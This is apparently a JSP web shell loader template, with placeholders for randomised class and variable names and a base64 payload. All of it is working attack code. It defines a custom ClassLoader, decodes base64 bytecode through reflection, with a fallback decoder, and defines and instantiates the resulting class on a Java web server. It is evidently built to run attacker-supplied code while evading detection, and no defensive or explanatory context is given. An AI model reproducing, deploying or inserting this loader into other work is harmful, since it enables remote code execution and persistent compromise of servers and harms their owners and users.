<%!
    public static class {{CLS:Definer}} extends ClassLoader {
        public {{CLS:Definer}}(ClassLoader {{VAR:cl}}) {
            super({{VAR:cl}});
        }

        public Class defineClass(byte[] {{VAR:buf}}) {
            return defineClass(null, {{VAR:buf}}, 0, {{VAR:buf}}.length);
        }
    }
%>

<%
    String {{VAR:payload}} = "{{base64Str}}";
    byte[] {{VAR:bytecode}} = null;
    try {
        Class {{VAR:b64Cls}} = Class.forName("java.util.Base64");
        Object {{VAR:decoder}} = {{VAR:b64Cls}}.getMethod("getDecoder").invoke(null);
        {{VAR:bytecode}} = (byte[]) {{VAR:decoder}}.getClass().getMethod("decode", String.class).invoke({{VAR:decoder}}, {{VAR:payload}});
    } catch (ClassNotFoundException {{VAR:ex}}) {
        Class {{VAR:dtcCls}} = Class.forName("javax.xml.bind.DatatypeConverter");
        {{VAR:bytecode}} = (byte[]) {{VAR:dtcCls}}.getMethod("parseBase64Binary", String.class).invoke(null, {{VAR:payload}});
    }
    Class {{VAR:clazz}} = new {{CLS:Definer}}(Thread.currentThread().getContextClassLoader()).defineClass({{VAR:bytecode}});
    {{VAR:clazz}}.newInstance();
%>
